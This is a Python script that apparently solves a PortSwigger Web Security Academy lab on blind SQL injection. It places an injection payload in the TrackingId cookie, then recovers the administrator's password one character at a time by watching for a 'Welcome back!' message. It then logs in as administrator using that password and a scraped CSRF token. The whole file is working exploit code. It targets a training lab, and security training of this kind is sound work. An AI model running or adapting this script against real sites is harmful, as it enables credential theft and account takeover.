#https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses#
import re
import requests

def csrf_fetch(response_text):
    match = re.search(r'name="csrf" value="(.+?)"', response_text)
    return match.group(1) if match else None

LAB_ID = "0a36004d04e7155f8147e3b9002e00df"
url = f"https://{LAB_ID}.web-security-academy.net/"
login_url = url+"login"

alnum = "0123456789abcdefghijklmnopqrstuvwxyz"

client = requests.Session()

r = client.get(url)

cookie = r.cookies
i = 1
password = ""
while True:
    prev_len = len(password)
    for char in alnum:
        cookie['TrackingId'] = f"' OR SUBSTRING((SELECT password FROM Users WHERE username = 'administrator'), {i}, 1) = '{char}"
        r = client.get(url, cookies=cookie)
        
        print(f"trying {i} {char}")
        print(r.status_code)
        if "Welcome back!" in r.text:
            print(f"char {i} = {char}")
            password = password + char
            break
    if prev_len == len(password): #reached the end of string
        break
    i+=1

print(f"the correct password is: {password}")

client.get(login_url)
login_data ={
    'username':'administrator',
    'password':password,
    'csrf':csrf_fetch(client.get(login_url).text)
}

#logging in with correct creds:
client.post(login_url, data=login_data)
print("logged in!")